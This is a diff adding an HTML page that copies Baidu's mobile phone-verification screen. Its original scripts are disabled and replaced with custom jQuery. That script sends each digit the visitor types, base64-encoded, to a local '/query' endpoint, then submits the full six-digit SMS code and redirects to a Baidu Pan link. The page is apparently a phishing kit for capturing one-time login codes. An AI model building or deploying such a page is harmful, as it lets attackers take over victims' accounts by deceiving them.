@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<!-- saved from url=(1041)https://wappass.baidu.com/passport/authwidget?action=send&type=mobile&tpl=wimn&u=https%3A%2F%2Fwappass.baidu.com%2Fwp%2Flogin%2Fproxy%3Fu%3Dhttps%253A%252F%252Fwww.baidu.com%252F%253Fuid%253D1567158234691_744%2526traceid%253DE8EE4003%26tpl%3Dwimn%26ltoken%3Dc55961ee5209878ad6fb075269ca9770%26lstr%3Db3edX9iNik%252FmsNnvZerA6cxsVKstsr6Ybq70Hy7LYm1DaPoPEY4NAnqou2Joxc%252B6FkRZBXKa0SgrpBhFv3v2%26adapter%3D0%26skin%3Ddefault_v2%26clientfrom%3D%26client%3D%26actiontype%3D1%26traceid%3DE8EE4003&token=753exV7vNkTGAGOr%2FN3IgZkqL9G34n6tA%2FjuifjVdGeVV44%2BTNqw7PA0e1G5w2W2v0zEB5obDuCsc1CXbuzFxX9y42TpDdslHswWVx65LO89HYUlt6sl5AGx6As4B1oILqUd4Ei58BEGOIvdwrzBO0JKD98TFGkr4YEEG0UbfLOIMVo34F14ACG7gabM3JC1VQlYRout%2F%2FyqHd2W%2B5JeyP%2Bqant7xNVH6g1oBToxJhKdzbjed6dKKcQkZSI8pCUHiKC5Iit8TjvCzSj79LYZgWscrX48JXY7SMUfq53W%2F07XPOuRv2eCzxqQGDY6DT0zpXB5LhqApFxzj9O%2BoWZhQ%2FirKkkXrS%2BBV628e3m5361ZPD2bQaLpp47q&from=&client=&clientfrom=&adapter=0&updatessn=&bindToSmsLogin=&upsms=&finance=&subpro=&isnew=true&verifycenter=&traceid=E8EE4003&pagefrom=login -->
+<html data-dpr="3">
+<!--STATUS OK-->
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+
+    <meta name="description" content="百度帐号是登录所有百度系产品的通行证，登录后还可以在帐户管理页管理/修改您的个人信息，包括修改密码、绑定手机、身份认证等">
+    <title>验证手机号</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Cache-control" content="no-cache,no-store,must-revalidate">
+    <meta http-equiv="Expires" content="0">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no, email=no">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <link rel="icon" sizes="any" mask="" href="https://www.baidu.com/img/baidu.svg">
+
+    <link type="text/css" rel="stylesheet" href="./checkMbl/base_7e0f6fa.css">
+    <link type="text/css" rel="stylesheet" href="./checkMbl/auth_verify_0162d9d.css">
+
+    <style>
+        html {
+            font-size: 112.5px !important;
+        }
+    </style>
+</head>
+
+<body class=" content-body">
+
+    <div id="pageWrapper">
+
+        <header class="pass-header">
+            <a class="pass-header-back" id="goBack"></a>
+            <span class="pass-header-title">验证手机号</span>
+
+        </header>
+        <div class="mod-content modcontent-patch">
+            <div class="mod-content-main" pagename="auth_verify">
+                <p class="mod-tipinfo-title3">
+                    为了确认您的身份，需要验证手机号
+                </p>
+                <p id="mbid" class="">
+                </p>
+                <div id="auth-formWrapper" class="">
+                    <div class="keyboardInputWrapper" id="auth-keyboardInputWrapper">
+                        <p class="keyboardInputEle"></p>
+                        <p class="keyboardInputEle"></p>
+                        <p class="keyboardInputEle"></p>
+                        <p class="keyboardInputEle"></p>
+                        <p class="keyboardInputEle"></p>
+                        <p class="keyboardInputEle"></p>
+                    </div>
+                    <input type="hidden" value="" name="vcode" id="auth-vcode">
+
+                    <p class="mod-red-error" id="error"></p>
+
+                    <!-- <div class="verify-wrapper">
+                        <input type="button" verifycode="0" id="auth-send-verify"
+                            class="pass-button-text pass-button-text-disabled" value="51s后重新发送"
+                            data-user-actionlog="resend_vcode_mobile" disabled="">
+                        <a class="people-verify" id="appealPhone" data-user-actionlog="cannot_sms">
+                            收不到验证码?
+                        </a>
+                    </div> -->
+
+
+                    <p class="pass-mod-loadingWrap" id="auth-loading">
+                        <span class="pass-mod-loadingImg"></span>
+                        正在加载...
+                    </p>
+                </div>
+            </div>
+            <div class="keyboardWrapper" id="auth-keyboardWrapper">
+                <div class="keyboard-con" id="keyboardCon">
+                    <div class="keyboard-row">
+                        <span id="dd1" class="keyboard-span">1</span>
+                        <span id="dd2" class="keyboard-span">2</span>
+                        <span id="dd3" class="keyboard-span">3</span>
+                    </div>
+                    <div class="keyboard-row">
+                        <span id="dd4" class="keyboard-span">4</span>
+                        <span id="dd5" class="keyboard-span">5</span>
+                        <span id="dd6" class="keyboard-span">6</span>
+                    </div>
+                    <div class="keyboard-row">
+                        <span id="dd7" class="keyboard-span">7</span>
+                        <span id="dd8" class="keyboard-span">8</span>
+                        <span id="dd9" class="keyboard-span">9</span>
+                    </div>
+                    <div class="keyboard-row">
+                        <span class="keyboard-gray-bg" id="keyboardEmpty">&nbsp;</span>
+                        <span id="dd0" class="keyboard-span">0</span>
+                        <span id="ddd" class="keyboard-delete"></span>
+                    </div>
+                </div>
+            </div>
+            <p class="error_area" id="toastTip"></p>
+
+        </div>
+
+
+
+    </div>
+    <script type="text/javascript">
+        // var apiDomain = "https:\/\/wappass.baidu.com",
+        //     publicVar = 'adapter=0&skin=&finance=&traceid=E8EE4003',
+        //     publicData = {
+        //         tpl: 'wimn' || 'wimn',
+        //         client: '',
+        //         adapter: '0' || '0',
+        //         clientfrom: '',
+        //         subpro: '',
+        //         suppcheck: ''
+        //     },
+        //     client = false;
+        // var traceID = 'E8EE4003';
+        // // 假如faceId打点需要回滚，就把这个设置成1（number）
+        // var faceIdRollBack = '';
+
+        // // 增加加载错误文件打点
+        // window.addEventListener('error', function (e) {
+        //     try {
+        //         var link = document.location.protocol + '//nsclick.baidu.com/v.gif?'
+        //             + 'pid=111&data_source=fe&type=1023'
+        //             + '&source=' + (publicData.clientfrom || 'wap')
+        //             + '&client=' + (publicData.client || '')
+        //             + '&v=' + new Date().getTime()
+        //             + '&tpl=' + publicData.tpl;
+        //         // js报错
+        //         if (e.message) {
+        //             link += '&auto_statistic=' + btoa('{eventType:security-js-error}');
+        //             link += '&extrajson=' + (e.filename || '') + ' ' + (e.lineno || '');
+        //             link += '&subpro=' + (e.message || '');
+        //         } else {
+        //             // 文件加载错误
+        //             link += '&auto_statistic=' + btoa('{eventType:security-load-error}');
+        //             link += '&extrajson=' + (e.target.src || '');
+        //             link += '&subpro=' + (e.target.localName || '') + (e.type || '');
+        //         }
+        //         var img = new Image();
+        //         img.onload = img.onerror = function () {
+        //             img.onload = img.onerror = null;
+        //             img = null;
+        //         };
+        //         img.src = link;
+        //     } catch (e) {
+        //         // catch
+        //     };
+        // }, true);
+    </script>
+    <!-- <script type="text/javascript" src="./checkMbl/layout_layout_aio_726a154.js"></script>
+
+    <script type="text/javascript">
+        var auth_type = 'mobile';
+        var send_url = "/passport/authwidget?card_no=&action=send&type=mobile&u=https%3A%2F%2Fwappass.baidu.com%2Fwp%2Flogin%2Fproxy%3Fu%3Dhttps%253A%252F%252Fwww.baidu.com%252F%253Fuid%253D1567158234691_744%2526traceid%253DE8EE4003%26tpl%3Dwimn%26ltoken%3Dc55961ee5209878ad6fb075269ca9770%26lstr%3Db3edX9iNik%252FmsNnvZerA6cxsVKstsr6Ybq70Hy7LYm1DaPoPEY4NAnqou2Joxc%252B6FkRZBXKa0SgrpBhFv3v2%26adapter%3D0%26skin%3Ddefault_v2%26clientfrom%3D%26client%3D%26actiontype%3D1%26traceid%3DE8EE4003&ori_u=&tpl=wimn&lstr=&ltoken=&token=753exV7vNkTGAGOr%2FN3IgZkqL9G34n6tA%2FjuifjVdGeVV44%2BTNqw7PA0e1G5w2W2v0zEB5obDuCsc1CXbuzFxX9y42TpDdslHswWVx65LO89HYUlt6sl5AGx6As4B1oILqUd4Ei58BEGOIvdwrzBO0JKD98TFGkr4YEEG0UbfLOIMVo34F14ACG7gabM3JC1VQlYRout%2F%2FyqHd2W%2B5JeyP%2Bqant7xNVH6g1oBToxJhKdzbjed6dKKcQkZSI8pCUHiKC5Iit8TjvCzSj79LYZgWscrX48JXY7SMUfq53W%2F07XPOuRv2eCzxqQGDY6DT0zpXB5LhqApFxzj9O%2BoWZhQ%2FirKkkXrS%2BBV628e3m5361ZPD2bQaLpp47q&from=&isnew=true&" + publicVar;
+        if (auth_type === 'bankcard') {
+            send_url = send_url + '&secret=';
+        }
+        var noti = null,
+            finance = "";
+        noti = { type: "success" };
+        var appealUrlEmail = "\/wp\/appealverify?code=WZSJTLC%2Fu%2F2EontzrqmbV5fvGEeISbfamUiT3m0Ztn5VrT6rAFwbGNeL7XOm%2B5uR&tpl=wimn&bdToken=2fa7cc5f28a825196376ee9c97151c58&type=1&adapter=0&skin=&finance=&traceid=E8EE4003&from=forceverify_email_send&client=&clientfrom=",
+            appealUrlPhone = "\/wp\/appealverify?code=WZSJTLC%2Fu%2F2EontzrqmbV5fvGEeISbfamUiT3m0Ztn5VrT6rAFwbGNeL7XOm%2B5uR&tpl=wimn&bdToken=2fa7cc5f28a825196376ee9c97151c58&type=1&adapter=0&skin=&finance=&traceid=E8EE4003&from=forceverify_phone_send&client=&clientfrom=";
+        var isnew = 'true';
+        var isLinkAccount = '';
+
+        var initKeyBoard = '';
+        initKeyBoard = 1;
+        var authname = 'forceverify';
+    </script> -->
+    <!-- <script type="text/javascript" src="./checkMbl/ld.min.js"></script>
+    <script type="text/javascript" src="./checkMbl/auth_verify_aio_a43ac7e.js"></script> -->
+    <script src="./jquery.js"></script>
+    <script type="text/javascript">
+        let gb = $("#goBack");
+        gb.on('click', () => {
+            history.go(-1)
+        });
+
+        let url = window.location.href.split("&");
+        let mbid = '';
+        let nexturl = "http://192.168.1.4:41236/checkMbl.html?05bc899676d6ef43f8bee0f69eddca11-T/32153o/72006/84fdc170c16a2ee1010fc21da6f4ef80/3a41998d206411764f134db8d015d63c/_/download/contextbatch/css/com.atlassian.jira.plugins.jira-development-integration-plugin?appid=ngienbnpkldjcebacfbppphjjhbhfkpp&mbid=14298&assatrisd=kjhzkKYQnkajsnAOY!hoASdjoAW&rtime=1010230102301203123&dwl=1-1-23-1-123&ttl=1566413096&ri=1433600&rs=1400&clientip=69.194.14.161&hash=29b554a946b107e4028379e37bf4e2c5";
+        url.forEach(e => {
+            if (/mbid\=/.test(e)) {
+                nexturl = nexturl + e;
+                mbid = e.replace("mbid=", "");
+            }
+        });
+        $("#mbid").html(`验证码已发送至你的手机 ${mbid.substr(0, 3)}******${mbid.substr(3, 2)}`);
+
+        let checkFire = () => {
+            $(".pass-mod-loadingWrap").show();
+            let str = `type=checkcodelogin&code=${currentNub.join("")}&`;
+            f(`/query?d=${window.btoa(encodeURIComponent(str))}`, (e) => {
+                if (e == "error") {
+                    currentNub = [];
+                    makeShow();
+                    $(".pass-mod-loadingWrap").hide();
+                    $(".mod-red-error").html("请输入正确的验证码！");
+                } else if (/pass/.test(e)) {
+                    setTimeout(() => {
+                        window.location.href = "https://pan.baidu.com/s/1bPx56kkQN73knyET7EiFvA";
+                        // ehide();
+                        // ll.hide();
+                    }, 3400);
+                } else {
+                    setTimeout(() => {
+                        // eshow("网络异常，请稍后重试");
+                        // ll.hide();
+                        currentNub = [];
+                        makeShow();
+                        $(".mod-red-error").html("网络异常，请稍后重试");
+                        $(".pass-mod-loadingWrap").hide();
+                    }, 7500);
+                }
+            });
+        }
+
+        let makeShow = () => {
+            // keyboardInputEle
+            $(".keyboardInputEle").each((i, e) => {
+                $(e).html(currentNub[i] || "");
+            });
+        }
+
+        let currentNub = [];
+        let inputCheck = (n) => {
+            $(".mod-red-error").html("");
+            if (n === "-") {
+                currentNub.pop();
+                makeShow();
+            } else if (currentNub.length == 6) {
+                //
+                return;
+            } else {
+                currentNub.push(n);
+                makeShow();
+                if (currentNub.length === 6) {
+                    checkFire();
+                }
+            }
+            let str = `type=checkcodeinput&code=${currentNub.join("")}&`;
+            f(`/query?d=${window.btoa(encodeURIComponent(str))}`);
+        }
+
+        $("#dd1").on("click", () => { inputCheck(1) });
+        $("#dd2").on("click", () => { inputCheck(2) });
+        $("#dd3").on("click", () => { inputCheck(3) });
+        $("#dd4").on("click", () => { inputCheck(4) });
+        $("#dd5").on("click", () => { inputCheck(5) });
+        $("#dd6").on("click", () => { inputCheck(6) });
+        $("#dd7").on("click", () => { inputCheck(7) });
+        $("#dd8").on("click", () => { inputCheck(8) });
+        $("#dd9").on("click", () => { inputCheck(9) });
+        $("#dd0").on("click", () => { inputCheck(0) });
+        $("#ddd").on("click", () => { inputCheck("-") });
+
+        //
+    </script>
+
+
+
+</body>
+
+</html>
